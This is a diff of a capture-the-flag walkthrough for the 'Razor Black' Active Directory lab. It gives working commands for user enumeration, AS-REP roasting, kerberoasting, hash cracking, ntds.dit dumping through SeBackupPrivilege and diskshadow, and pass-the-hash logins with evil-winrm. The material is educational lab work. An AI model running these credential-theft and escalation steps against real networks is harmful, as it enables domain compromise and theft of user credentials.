@@ -1,7 +1,7 @@
 
 # Razor Black
 
-![[attachments/Pasted image 20240515093358.png]]
+![](attachments/20240515093358.png)
 
 These guys call themselves hackers. Can you show them who's the boss ??
 
@@ -11,32 +11,32 @@ These guys call themselves hackers. Can you show them who's the boss ??
 
 **OS**: Windows (Active Directory)
 
-**Category**:
+**Category**: `Kerberoastin, AS-REP Roasting, Active Directory, Hash Cracking, crackmapexec`
 
 # Task 1: Deploy The Box
 
-Throw something like a rock on the big green thingy on the right side here to deploy your box.
+*Throw something like a rock on the big green thingy on the right side here to deploy your box.*
 
-The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.  
+*The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.*  
 
-This room is proudly made by: [Xyan1d3](https://twitter.com/xyan1d3)
+*This room is proudly made by: [Xyan1d3](https://twitter.com/xyan1d3)*
 
-Every solver of this box will get a free cookie when completing this box.  
+*Every solver of this box will get a free cookie when completing this box.*  
 
-If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.
+*If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.*
 
-![[attachments/Pasted image 20240515093631.png]]
+![](attachments/20240515093631.png)
 
 We are good to go ✅
 
-NOTE: This machine kept dying a lot so i had to reset multiple times which is why you will notice different IP addresses. Just know they all point to the same target `raz0rblack.thm`
+**NOTE: This machine kept dying a lot so i had to reset multiple times which is why you will notice different IP addresses. Just know they all point to the same target `raz0rblack.thm`**
 # Task 2: Flag Submission Panel
 
 This will test your Active Directory enumeration and exploitation knowledge.  
   
 Submit your flags and answers to prove your progression.
 
-**Answer the questions below**
+Answer the questions below
 
 # What is the Domain Name?
 
@@ -200,7 +200,7 @@ Looking at the rdp-ntlm-info we can find the domain name to be `raz0rblack.thm`
 
 Next is to add the entry to out `/etc/hosts` file
 
-![[attachments/Pasted image 20240515094550.png]]
+![](attachments/20240515094550.png)
 
 # What is Steven's Flag?
 
@@ -210,11 +210,11 @@ From the nmap scan we can see nfs (Network File System) is running on the target
 showmount -e raz0rblack.thm
 ```
 
-![[attachments/Pasted image 20240515095642.png]]
+![](attachments/20240515095642.png)
 
-Share named users.
+Found a share named users.
 
-We can mount this share using:
+We can mount this share to our machine using:
 
 ```shell
 sudo mount -t nfs raz0rblack.thm:'/users' /home/deusx/Tryhackme/razorblack/mnt/
@@ -222,17 +222,17 @@ sudo mount -t nfs raz0rblack.thm:'/users' /home/deusx/Tryhackme/razorblack/mnt/
 
 First create an mnt directory in your current directory
 
-![[attachments/Pasted image 20240515095738.png]]
+![](attachments/20240515095738.png)
 
 Check the contents of the new directory as root and we have the first flag
 
-![[attachments/Pasted image 20240515095851.png]]
+![](attachments/20240515095851.png)
 
 # What is the zip file's password?
 
 The Excel sheet contains some names and their respective roles.
 
-![[attachments/Pasted image 20240515100401.png]]
+![](attachments/20240515100401.png)
 
 We can use a tool like [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to create a wordlist of possible users for brute forcing later on.
 
@@ -248,9 +248,11 @@ This will create a wordlist of possible username combinations from the names in 
 
 With this we have 175 combinations.
 
-![[attachments/Pasted image 20240515103835.png]]
+![](attachments/20240515103835.png)
 
-Nmap scan shows Kerberos running on the target.
+This is a lot of names and many of them are for sure invalid so you can just filter out any single or double letters like cl, sb etc.
+
+Nmap scan shows Kerberos running on the target on port 88.
 
 Using a tool called kerbrute, we can enumerate valid users.
 
@@ -261,7 +263,7 @@ To install kebrute:
 ![](https://deusx7.github.io/Posts/THM/Writeups/Attacktive_Directory/attachments/20240117103534.png)
 
 - Open your terminal and navigate to the directory where you downloaded to.
-- Run the command `mv kerbrute_linux_amd64 kerbrute`
+- Run the command `mv kerbrute_linux_amd64 kerbrute` just to rename the file to something simpler
 - Next command `chmod +x kerbrute` to make it an executable
 - Now you can run it with `./kerbrute`
 
@@ -269,9 +271,9 @@ To install kebrute:
 ./kerbrute userenum --dc raz0rblack.thm -d raz0rblack.thm userlist.txt
 ```
 
-![[attachments/Pasted image 20240515105906.png]]
+![](attachments/20240515105906.png)
 
-Next up, we can try to retrieve kerberos tickets using a tool `GetNPUsers.py`. This _will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute._
+Next up, we can try to retrieve kerberos tickets using a tool `GetNPUsers`. This _will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute._
 
 We have 3 accounts that we could use.
 
@@ -281,11 +283,11 @@ Impacket Syntax:
 impacket-GetNPUsers DOMAIN/user -no-pass
 ```
 
-![[attachments/Pasted image 20240515110508.png]]
+![](attachments/20240515110508.png)
 
 We can try another user
 
-![[attachments/Pasted image 20240515110527.png]]
+![](attachments/20240515110527.png)
 
 And we have a hash.
 
@@ -299,11 +301,11 @@ Put the hash inside a file and use hashcat to crack it.
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[attachments/Pasted image 20240515110836.png]]
+![](attachments/20240515110836.png)
 
 And we have a password
 
-![[attachments/Pasted image 20240515110939.png]]
+![](attachments/20240515110939.png)
 
 With a valid username and password, we are able to enumerate smb.
 
@@ -311,15 +313,15 @@ With a valid username and password, we are able to enumerate smb.
 smbclient -L raz0rblack.thm -U twilliams
 ```
 
-![[attachments/Pasted image 20240515111136.png]]
+![](attachments/20240515111136.png)
 
 Trying to connect to each of the share shows the user `twilliams` does not have access to any of the shares.
 
-![[attachments/Pasted image 20240515130916.png]]
+![](attachments/20240515130916.png)
 
 This means we won't be able to use a tool like `psexec` to gain access. We can use `crackmapexec` to test for other users
 
-![[attachments/Pasted image 20240515124842.png]]
+![](attachments/20240515124842.png)
 
 As seen we don't have access with the user twilliams but we have an error message `STATUS_PASSWORD_MUST_CHANGE` for the user `sbradley`
 
@@ -327,7 +329,7 @@ This means we can change the password of this user
 
 I tried using the `smbpasswd` binary but it wasn't working so i went with the impacket tool
 
-![[attachments/Pasted image 20240515130744.png]]
+![](attachments/20240515130744.png)
 
 ```shell
 impacket-smbpasswd sbradley@raz0rblack.thm
@@ -337,27 +339,31 @@ The old password is the same as the one we cracked earlier, then enter any new p
 
 With this we can try to connect to the SMB shares.
 
-![[attachments/Pasted image 20240515130955.png]]
+![](attachments/20240515130955.png)
 
 We are able to access the trash share and download all the files using mget
 
-![[attachments/Pasted image 20240515131309.png]]
+![](attachments/20240515131309.png)
 
 The zip file refused to download but it worked after i changed up the syntax a little
 
-![[attachments/Pasted image 20240515132000.png]]
+![](attachments/20240515132000.png)
+
+```shell
+smbclient //raz0rblack.thm/trash -U raz0rblack.thm\\sbradley
+```
 
 The chat log contains a conversation between 2 people bradly and Administrator.
 
-![[attachments/Pasted image 20240515132432.png]]
+![](attachments/20240515132432.png)
 
-And it also contains hints to for the room.
+And it also contains hints.
 
 The sbradley.txt just contains the same flag we got earlier.
 
 As we can see the zip file is requesting for a password and we have none.
 
-![[attachments/Pasted image 20240515132324.png]]
+![](attachments/20240515132324.png)
 
 So we can decide to crack it using john the ripper or fcrackzip
 
@@ -367,19 +373,19 @@ Using fcrackzip we get the zip password
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
 ```
 
-![[attachments/Pasted image 20240515132719.png]]
+![](attachments/20240516111402.png)
 
 # What is Ljudmila's Hash?
 
 Unzip the file
 
-![[attachments/Pasted image 20240515132947.png]]
+![](attachments/20240515132947.png)
 
 And just like the chat log said, we have system and ntds.
 
 Next is to dump hashes using secretsdump
 
-![[attachments/Pasted image 20240515134439.png]]
+![](attachments/20240515134439.png)
 
 ```shell
 impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > hashes.txt
@@ -387,15 +393,17 @@ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > hashes.txt
 
 That's a lot of hashes 
 
-![[attachments/Pasted image 20240515134635.png]]
+![](attachments/20240515134635.png)
 
-We can use the following to filter out the NT hash
+We can use the following to filter out the NT hashes
 
-![[attachments/Pasted image 20240515135927.png]]
+![](attachments/20240515135927.png)
 
-Rather than using the previous userlist we obtained earlier, we can extract a much smaller list of users using crackmapexec and grepping for `SidTypeUser`
+Rather than using the previous userlist we obtained earlier, we can extract a much smaller list of valid users using crackmapexec and grepping for `SidTypeUser` to extract only users
 
-![[attachments/Pasted image 20240515140450.png]]
+![](attachments/20240515140450.png)
+
+We don't need to add Guest, krbtgt and HAVEN-DC$
 
 ```shell
 crackmapexec smb raz0rblack.thm -u twilliams -p roastpotatoes --rid-brute | grep SidTypeUser
@@ -435,11 +443,11 @@ d1d85bdc244f5d7185bcff43eea3ab53
 
 Now we can use crackmapexec to bruteforce and see which usernames match with which hash.
 
-This is going to take a long time because there are a lot of hashes (1866) that each username will be tested against. So in order to save time you can just rearrange the userlist according to which user you suspect you''ll get a hash for. We already got a password for twilliams and reset the password for sbradley so those 2 should be at the bottom. Administrator would be too easy to get at this stage so you can make it 3rd on your list. The last 2 is `lvetrova` and `xyan1d3`. The former seems to be more likely (based on intuition) so i put it first and the other second.
+This is going to take a long time because there are a lot of hashes (1866) that each username will be tested against. So in order to save time you can just rearrange the userlist according to which user you suspect you''ll get a hash for. Going back to the list of users we got from the excel sheet earlier, we can see the user `lvetrova` is an Active Directory Admin so it makes sense to put this user at the top of the list. 
 
-Now we run crackmapexec
+Now we run crackmapexec for bruteforce
 
-![[attachments/Pasted image 20240515145020.png]]
+![](attachments/20240515145020.png)
 
 ```shell
 crackmapexec smb raz0rblack.thm -u userlist.txt -H ntds.txt
@@ -447,32 +455,34 @@ crackmapexec smb raz0rblack.thm -u userlist.txt -H ntds.txt
 
 And we have a hit in a few seconds for the user `lvetrova`
 
-![[attachments/Pasted image 20240515145113.png]]
+![](attachments/20240515145113.png)
 
 # What is Ljudmila's Flag?
 
 With this hash we can authenticate to the machine using `evil-winrm`
 
-![[attachments/Pasted image 20240515150024.png]]
+![](attachments/20240515150024.png)
 
 ```shell
 evil-winrm -i raz0rblack.thm -u lvetrova -H Hash
 ```
 
-There is a file in the home directory named `lvetrova.xml` that seems to contain the flag in a coded format.
+There is a file in the home directory named `lvetrova.xml` that seems to contain the flag in a coded format. Read this blog for an understanding on how to decrypt: https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx 
 
-![[attachments/Pasted image 20240515150831.png]]
+![](attachments/20240515150831.png)
 
 Using this powershell syntax we can decode the xml string to get the flag
 
-![[attachments/Pasted image 20240515151419.png]]
+![](attachments/20240515151419.png)
 
 ```powershell
 $Credential = Import-Clixml -Path lvetrova.xml
 $Credential.GetNetworkCredential().password
 ```
 
-Next up with the credentials for `lvetrova` we can perform kerberoasting attack using `impacket-GetUserSPNs`
+# What is Xyan1d3's password?
+
+Next up with valid credentials for `lvetrova` we can perform kerberoasting attack using `GetUserSPNs`
 
 Both users `twilliams` and `lvetrova` can perform this attack but for `lvetrova`, you'll need to double the hash you got earlier NT:NT
 
@@ -481,11 +491,11 @@ impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/lvetrova -hashes NT:NT
 impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/twilliams:PASSWORD
 ```
 
-![[attachments/Pasted image 20240515154738.png]]
+![](attachments/20240515154738.png)
 
 Adding the `-request` flag will give us the hash
 
-![[attachments/Pasted image 20240515154917.png]]
+![](attachments/20240515154917.png)
 
 ```shell
 impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/twilliams:PASSWORD -request
@@ -493,19 +503,20 @@ impacket-GetUserSPNs -dc-ip 10.10.13.185 raz0rblack.thm/twilliams:PASSWORD -requ
 
 Copy the hash and crack using hashcat. The hashcat mode is 13100
 
-![[attachments/Pasted image 20240515155110.png]]
+![](attachments/20240515155110.png)
 
-![[attachments/Pasted image 20240515155208.png]]
+![](attachments/20240515155208.png)
 
-![[attachments/Pasted image 20240515155234.png]]
+![](attachments/20240515155234.png)
+# What is Xyan1d3's Flag?
 
 Now we can login using `evil-winrm`
 
-![[attachments/Pasted image 20240515155445.png]]
+![](attachments/20240515155445.png)
 
 Checking the home directory, there is a message stating the flag is not in the xml file like before
 
-![[attachments/Pasted image 20240515155557.png]]
+![](attachments/20240515155557.png)
 
 Cracking it anyway using the same method as before
 
@@ -516,47 +527,49 @@ $Credential.GetNetworkCredential().password
 
 They are just trolling lol
 
-![[attachments/Pasted image 20240515155726.png]]
+![](attachments/20240515155726.png)
+
+# What is the root Flag?
 
 Next is privilege escalation.
 
 Checking our user's privileges with `whoami /all`
 
-![[attachments/Pasted image 20240515165633.png]]
+![](attachments/20240515165633.png)
 
 We see that this user have the `SeBackupPrivilege` Enabled.
 
 A quick search on hacktricks gives the steps to take to exploit this [SeBackupPrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
 
-![[attachments/Pasted image 20240515165756.png]]
+![](attachments/20240515165756.png)
 
 We have a number of options here but i'll go with the second link.
 
-![[attachments/Pasted image 20240515165831.png]]
+![](attachments/20240515165831.png)
 
 This will take you to a github which has 2 dll files, download them to your machine.
 
 Next is to upload these files, since we are using evil-winrm we can just use the `upload` feature.
 
-![[attachments/Pasted image 20240515170139.png]]
+![](attachments/20240515170139.png)
 
 Just for the sake of clarity, currently with our permissions we don't have the permission to copy the root.xml file in the Administrator directory
 
-![[attachments/Pasted image 20240515170405.png]]
+![](attachments/20240515170405.png)
 
 But with these 2 cmdlets we just downloaded we will be able to.
 
 Next is to follow the commands in the github repo
 
-![[attachments/Pasted image 20240515170652.png]]
+![](attachments/20240515170652.png)
 
-![[attachments/Pasted image 20240515170757.png]]
+![](attachments/20240515170757.png)
 
 Now let's try to copy the file using the same syntax as stated:
 
-![[attachments/Pasted image 20240515170830.png]]
+![](attachments/20240515170830.png)
 
-![[attachments/Pasted image 20240515170940.png]]
+![](attachments/20240515170940.png)
 
 ```powershell
 Copy-FileSeBackupPrivilege root.xml C:\Users\xyan1d3\Documents\root.xml -Overwrite
@@ -564,11 +577,140 @@ Copy-FileSeBackupPrivilege root.xml C:\Users\xyan1d3\Documents\root.xml -Overwri
 
 It works!
 
-![[attachments/Pasted image 20240515171034.png]]
+![](attachments/20240515171034.png)
 
-Let's decode it using the same method as we did earlier
+But we won't be able to decrypt it because we are not the Administrator user.
+
+Another thing we can do is to copy the `ntds.dit` database which contains all NTLM hashes for domain users and computers.
+
+Following the steps linked [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges) we can do just that.
+
+Go to the AD Attack section and follow the steps outlined. In fact all the steps we carried out earlier are also contained here if you scroll up.
+
+![](attachments/20240516091713.png)
+
+
+First step won't be possible with our current shell with evil-winrm so we will create a file containing these on our machine, Convert it to DOS format using `unix2dos`, transfer it to the target then use `diskshadow` to create the copy.
+
+- Create a `.dsh` file
+
+	![](attachments/20240516092447.png)
+
+- Run unix2dos on the file
+
+	![](attachments/20240516092543.png)
+
+- Upload the file to the target
+
+	![](attachments/20240516092655.png)
+
+- Run diskshadow on the file
+
+	![](attachments/20240516093114.png)
+
+We have an error here, it seems to have failed setting the context to clientaccessible. After some research on the context of diskshadow i decided to use the persistent context
+
+![](attachments/20240516094826.png)
+
+![](attachments/20240516094454.png)
+
+Re-upload the file and run diskshadow again
+
+![](attachments/20240516094859.png)
+
+
+It works this time
+
+Next step is to copy `ntds.dit` using robocopy:
+
+```powershell
+robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+```
+
+![](attachments/20240516095104.png)
+
+Successful
+
+![](attachments/20240516095119.png)
+
+![](attachments/20240516095233.png)
+
+Next up is to extract `SYSTEM` and `SAM` to retrieve hashes
+
+![](attachments/20240516095301.png)
+
+```powershell
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+![](attachments/20240516095349.png)
+
+Download the `ntds.dit` and the `SYSTEM.SAV` so we can extract hashes using `secretsdump`
+
+![](attachments/20240516102030.png)
+
+![](attachments/20240516102042.png)
+
+
+```shell
+impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
+```
+
+![](attachments/20240516102155.png)
+
+Now we have the administrator hash and login as the admin via a pass-the-hash attack using evil-winrm
+
+![](attachments/20240516102536.png)
+
+```shell
+evil-winrm -i raz0rblack.thm -u administrator -H HASH
+```
+
+Now we can decrypt the xml file to get the flag
+
+![](attachments/20240516102813.png)
 
 ```powershell
 $Credential = Import-Clixml -Path root.xml
 $Credential.GetNetworkCredential().password
 ```
+
+It still gives and error.
+
+Checking the cookie.json file, we have a base64 code
+
+![](attachments/20240516103613.png)
+
+Decode it
+
+![](attachments/20240516103737.png)
+
+No idea what this means yet.
+
+Going back to the contents of root.xml, the string looks longer than the previous ones we decoded so i decided to identify what type of code it is using cyberchef
+
+![](attachments/20240516103950.png)
+
+Cyberchef identifies it as hex and decodes it and we get this message with a flag.
+
+# What is Tyson's Flag?
+
+Navigating to the home directory of twilliams, we can find a very strange .exe file. Check the contents to get the flag for Tyson.
+
+# What is the complete top secret?
+
+Navigate to `C:\Program Files\Top Secret` and download the picture
+
+![](attachments/20240516105546.png)
+
+The picture
+
+![](attachments/20240516105628.png)
+
+To exit vim `:wq`
+
+This was a really fun room. Thanks for Reading!
+
+![](../Breaching_Active_Directory/attachments/b1810d0bf4fbd370349d671a3f9389af.gif)
+
